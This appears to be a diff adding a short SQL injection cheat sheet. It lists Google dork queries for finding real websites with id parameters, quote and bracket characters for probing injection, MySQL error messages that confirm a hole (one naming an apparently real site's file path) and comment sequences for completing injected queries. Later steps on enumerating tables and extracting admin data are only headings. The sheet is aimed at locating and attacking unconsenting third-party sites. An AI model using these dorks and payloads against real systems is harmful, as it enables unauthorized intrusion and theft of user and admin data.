@@ -1,0 +1,51 @@
+SQL Injection
+
+1. Finding a website that has vulnerability
+
+inurl:index.php?id=10
+inurl:main.php?id=admin
+inurl:news.php?id=
+inurl:page.php?id=
+inurl:content.php?id=
+inurl:detail.php?id=
+inurl:article.php?id=
+inurl:newsdetail.php?id=
+inurl:gallery.php?id=
+inurl:pageid=
+inurl:videos.php?id=
+
+2. Can we sql inject the page?
+
+Special characters: ', " , ) , ')) , ") ,")) ,') ,')) ***\
+
+Erros: 
+
+[1]Query failed : You have an error in your SQL syntax; check the manual that corresponds
+ to your MySQL server version for the right syntax to use near ''' at line 1 
+
+[2] (Warning: mysql_fetch_array(): supplied argument is not a valid MySQL result resource 
+in C:\Inetpub\vhosts\jayapriya.com\httpdocs\gallery.php on line 11)
+
+Warning: mysql_fetch_array():
+Warning: mysql_fetch_assoc():
+Warning: mysql_numrows():
+Warning: mysql_num_rows():
+Warning: mysql_result():
+Warning: mysql_preg_match():
+
+$sql = "SELECT * FROM users WHERE id ='5'';
+
+
+3. Fix the sql query.
+
+Characters: --+,#,%23,-- -,--space, ; , %60
+
+4. Finding out column number in the database
+
+5. Finding vulnerable column & database version
+
+6. Finding out tables in the database.
+
+7. Finding columns in the admin table
+
+8. Fetch info from the table
